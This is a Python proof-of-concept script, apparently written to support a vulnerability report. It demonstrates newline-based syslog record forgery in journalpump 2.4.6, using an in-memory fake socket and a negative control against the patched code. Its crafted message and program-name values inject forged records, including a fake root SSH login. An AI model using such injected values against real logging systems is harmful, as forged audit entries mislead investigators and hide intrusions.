#!/usr/bin/env python3
"""Harmless deterministic PoC: journalpump 2.4.6 syslog record forgery via newlines.

Uses the vendored vulnerable rsyslog.py from tag 2.4.6 (no network, synthetic data).
Negative control: master rsyslog.py with sanitize + escape_newlines=True.
"""
from __future__ import annotations

import datetime
import importlib.util
import socket
import sys
import types
from pathlib import Path

ROOT = Path(__file__).resolve().parent
EV = ROOT / "evidence"


def load_module(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


class FakeSock:
    def __init__(self) -> None:
        self.buf = bytearray()

    def sendall(self, data: bytes) -> None:
        self.buf.extend(data)

    def close(self) -> None:
        pass


def craft(client_cls, formatter):
    c = object.__new__(client_cls)
    c.server = "127.0.0.1"
    c.port = 6514
    c.max_msg = 8192
    c.socket_proto = socket.SOCK_STREAM
    c.ssl_context = None
    c.formatter = formatter
    c.socket = FakeSock()
    return c


def main() -> None:
    vuln = load_module("rsyslog_vuln", EV / "rsyslog_2.4.6.py")
    ts = (
        datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S")
        + ".000000+00:00"
    )
    forged_msg = (
        "innocent stack frame\n"
        "<13>1 2026-11-02T00:00:00.000000+00:00 forged-host sshd 4242 - - "
        "FAKE ACCEPTED password for root from 1.2.3.4"
    )
    forged_program = (
        "app\n<13>1 2026-11-02T00:00:00.000000+00:00 victim root - - forged-as-root"
    )

    print("=== TEST 1: MESSAGE body newline forgery (2.4.6) ===")
    c = craft(vuln.SyslogTcpClient, vuln._rfc_5424_formatter)
    c.log(
        facility=1,
        severity=6,
        timestamp=ts,
        hostname="real-host",
        program="myapp",
        pid=1001,
        msgid=None,
        msg=forged_msg,
    )
    raw = bytes(c.socket.buf)
    parts = [p for p in raw.split(b"\n") if p]
    print(raw)
    assert len(parts) >= 2 and b"FAKE ACCEPTED" in raw
    print("PASS\n")

    print("=== TEST 2: program-name header forgery (2.4.6) ===")
    c = craft(vuln.SyslogTcpClient, vuln._rfc_5424_formatter)
    c.log(
        facility=1,
        severity=6,
        timestamp=ts,
        hostname="real-host",
        program=forged_program,
        pid=1001,
        msgid=None,
        msg="hello",
    )
    raw2 = bytes(c.socket.buf)
    parts2 = [p for p in raw2.split(b"\n") if p]
    print(raw2)
    assert len(parts2) >= 2 and b"forged-as-root" in raw2
    print("PASS\n")

    print("=== NEGATIVE CONTROL: master sanitize + escape ===")
    pkg = types.ModuleType("journalpump")
    util = types.ModuleType("journalpump.util")

    def escape_linebreaks(s: str) -> str:
        return s.replace("\\", "\\\\").replace("\r", "\\r").replace("\n", "\\n")

    util.escape_linebreaks = escape_linebreaks
    sys.modules["journalpump"] = pkg
    sys.modules["journalpump.util"] = util
    fix = load_module("journalpump.rsyslog", EV / "rsyslog_master.py")
    c3 = craft(fix.SyslogTcpClient, fix._rfc_5424_formatter)
    c3.octet_counted_framing = False
    c3.escape_newlines = True
    c3.log(
        facility=1,
        severity=6,
        timestamp=ts,
        hostname="real-host",
        program=forged_program,
        pid=1001,
        msgid=None,
        msg=forged_msg,
    )
    raw3 = bytes(c3.socket.buf)
    parts3 = [p for p in raw3.split(b"\n") if p]
    print(raw3)
    assert len(parts3) == 1
    print("PASS\n")
    print("=== ALL PoC CHECKS PASSED ===")
    (ROOT / "poc_results.txt").write_text("ALL PoC CHECKS PASSED\n", encoding="utf-8")


if __name__ == "__main__":
    main()
